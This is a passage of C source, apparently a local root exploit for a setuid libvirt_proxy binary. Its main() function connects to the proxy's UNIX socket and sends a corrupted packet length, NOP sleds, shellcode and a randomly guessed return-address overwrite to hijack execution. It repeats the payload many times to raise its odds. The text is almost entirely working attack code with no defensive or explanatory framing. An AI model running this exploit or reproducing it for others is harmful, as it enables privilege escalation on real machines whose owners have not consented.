int
main(int argc, char **argv)
{
	FILE *fp;
	long ptr;
	int i, fd, pid, ret;
        char *pkt, nop[65536];
	struct sockaddr_un addr;
	struct proxy_packet req;
	struct timeval tv;

	signal(SIGPIPE, SIG_IGN);

	/* guess a random offset to jmp to */
	gettimeofday(&tv, NULL);
	srand((tv.tv_sec ^ tv.tv_usec) ^ getpid());
	ptr = 0xbf000000 + (rand() & 0x00ffffff);

	/* fire up the setuid libvirt_proxy */
	pid = fork();
	if (pid == 0) {
		execl(PROXY_PATH, "libvirt_proxy", NULL);
	}

	memset(nop, '\x90', sizeof(nop));

	/* connect to libvirt_proxy's AF_UNIX socket */
	fd = socket(PF_UNIX, SOCK_STREAM, 0);
	if (fd < 0) {
		printf("[-] failed to create unix socket\n");
		return 1;
	}

	memset(&addr, 0, sizeof(addr));
	addr.sun_family = AF_UNIX;
	addr.sun_path[0] = '\0';
	strncpy(&addr.sun_path[1], PROXY_SOCKET_PATH, strlen(PROXY_SOCKET_PATH));

	printf("[+] connecting to libvirt_proxy\n");

	if (connect(fd, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
		printf("[-] cant connect to libvirt_proxy socket\n");
		return 1;
	}

	/* transmit malicious payload to libvirt_proxy */
	pkt = (char *) &req;
	memset(&req, 0, sizeof(req));
	req.version = PROXY_PROTO_VERSION;
	req.len = PROXY_PACKET_LENGTH;

	printf("[+] sending initial packet header\n");
	send(fd, pkt, 7, 0);

	usleep(100000);

	printf("[+] sending corrupted length value\n");
	send(fd, pkt + 7, 1, 0);

	printf("[+] sending primary NOP sled\n");
	send(fd, nop, 4096, 0);

	printf("[+] sending primary shellcode\n");
	send(fd, shellcode, 28, 0);

	printf("[+] sending EIP overwrite (0x%lx)\n", ptr);
	send(fd, &ptr, 4, 0);

	usleep(100000);

	printf("[+] sending secondary NOP/shellcode bundles\n");
	for (i = 0; i < 100; ++i) {
		send(fd, nop, 1000, 0);
		send(fd, shellcode, 28, 0);
	}
	close(fd);

	usleep(800000);

	/* clean slate if our guessed addr failed */
	kill(pid, SIGKILL);

	return 0;
}